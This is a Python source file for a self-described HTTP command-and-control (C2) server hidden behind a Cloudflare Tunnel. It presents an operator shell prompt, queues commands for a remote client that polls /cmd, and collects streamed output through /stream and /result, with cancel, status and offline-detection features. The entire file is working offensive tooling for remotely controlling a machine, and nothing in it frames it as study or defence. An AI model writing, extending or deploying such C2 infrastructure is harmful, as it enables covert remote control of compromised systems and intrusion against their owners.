#!/usr/bin/env python3
"""
HTTP-based C2 server with streaming output and cancel support.
Runs on Mac behind Cloudflare Tunnel.
Usage: python3 server.py
"""

from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
import socket
import threading
import sys
import time
import queue
import readline  # enables arrow-key history in input()
readline.parse_and_bind(r'"\C-x": "cancel\n"')  # Ctrl+X = cancel (Ctrl+C would kill server)

pending_command = None
pending_signal = None
lock = threading.Lock()
last_checkin = 0
result_queue = queue.Queue(maxsize=500)  # (kind, body)  kind = "stream" | "result"
command_running = False


class DualStackHTTPServer(ThreadingMixIn, HTTPServer):
    """Listen on both IPv4 and IPv6 so cloudflared can connect via either."""
    daemon_threads = True
    address_family = socket.AF_INET6
    request_queue_size = 32

    def server_bind(self):
        self.socket.setsockopt(socket.IPPROTO_IPV6, socket.IPV6_V6ONLY, 0)
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        super().server_bind()


class Handler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass

    protocol_version = "HTTP/1.1"

    def _respond(self, code, body=b""):
        """Helper to send a response with proper headers."""
        self.send_response(code)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Content-Length", str(len(body)))
        # Always close: cloudflared tunnels HTTP/2 internally;
        # keeping connections alive causes it to send HTTP/2 frames
        # on what Python sees as an HTTP/1.1 socket → 400 Bad Request.
        self.send_header("Connection", "close")
        self.end_headers()
        self.wfile.write(body)

    def do_GET(self):
        global pending_command, pending_signal, last_checkin
        if self.path == "/cmd":
            with lock:
                last_checkin = time.time()
                cmd = pending_command or ""
                pending_command = None
            self._respond(200, cmd.encode())

        elif self.path == "/signal":
            # Client polls this during command execution for cancel signals
            with lock:
                sig = pending_signal or ""
                pending_signal = None  # one-shot: clear after read
            self._respond(200, sig.encode())

        elif self.path == "/ping":
            with lock:
                last_checkin = time.time()
            self._respond(200, b"pong")

        else:
            self._respond(404)

    def do_POST(self):
        global command_running
        length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(length).decode(errors="replace")

        if self.path == "/stream":
            # Streaming chunk — partial output from running command
            try:
                result_queue.put_nowait(("stream", body))
            except queue.Full:
                pass  # drop chunk rather than blocking the HTTP handler
            self._respond(200, b"ok")

        elif self.path == "/result":
            # Final result — command finished/cancelled/timed out
            with lock:
                command_running = False
            try:
                result_queue.put_nowait(("result", body))
            except queue.Full:
                pass
            self._respond(200, b"ok")

        else:
            self._respond(404)


def result_printer():
    """Drain the result queue and print output cleanly."""
    while True:
        try:
            kind, body = result_queue.get(timeout=0.5)
            if body:
                sys.stdout.write("\r\033[K" + body)
            if kind == "result":
                # Command finished — re-show prompt
                sys.stdout.write("shell> ")
            sys.stdout.flush()
        except queue.Empty:
            pass


def input_loop():
    global pending_command, pending_signal, command_running
    while True:
        try:
            cmd = input("shell> ")
            if not cmd.strip():
                continue
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Exiting.")
            sys.exit(0)

        stripped = cmd.strip().lower()

        # --- Built-in commands ---
        if stripped == "cancel":
            with lock:
                if command_running or pending_command:
                    pending_signal = "cancel"
                    pending_command = None
                    print("[*] Cancel signal queued. Client will abort current command.")
                else:
                    print("[*] No command is currently running.")
            continue

        if stripped == "status":
            with lock:
                elapsed = time.time() - last_checkin if last_checkin > 0 else -1
                is_running = command_running
            if elapsed < 0:
                print("[*] No client check-in yet.")
            elif elapsed < 10:
                state = "RUNNING command" if is_running else "IDLE"
                print(f"[*] Client ONLINE ({state}) — last check-in {elapsed:.1f}s ago")
            else:
                print(f"[!] Client may be OFFLINE — last check-in {elapsed:.0f}s ago")
            continue

        if stripped == "help":
            print("[*] Built-in commands:")
            print("      cancel  — abort the currently running command")
            print("      status  — check client connectivity")
            print("      exit    — tell client to shut down")
            print("      help    — show this message")
            print("    Anything else is sent to the remote shell.")
            continue

        # --- Remote command ---
        with lock:
            if pending_command:
                print("[!] Previous command still pending — overwriting.")
            pending_command = cmd
            command_running = True


def status_printer():
    shown_warning = False
    while True:
        time.sleep(10)
        with lock:
            checkin = last_checkin
        if checkin > 0:
            elapsed = time.time() - checkin
            if elapsed > 20 and not shown_warning:
                sys.stdout.write(
                    f"\r\033[K[!] No check-in for {elapsed:.0f}s — client may be offline\nshell> "
                )
                sys.stdout.flush()
                shown_warning = True
            elif elapsed <= 20:
                shown_warning = False


if __name__ == "__main__":
    PORT = 4444
    server = DualStackHTTPServer(("::", PORT), Handler)
    print(f"[*] Listening on port {PORT} (IPv4 + IPv6)")
    print("[*] Waiting for client to connect...")
    print("[*] Type 'help' for built-in commands\n")

    threading.Thread(target=input_loop, daemon=True).start()
    threading.Thread(target=result_printer, daemon=True).start()
    threading.Thread(target=status_printer, daemon=True).start()

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped.")
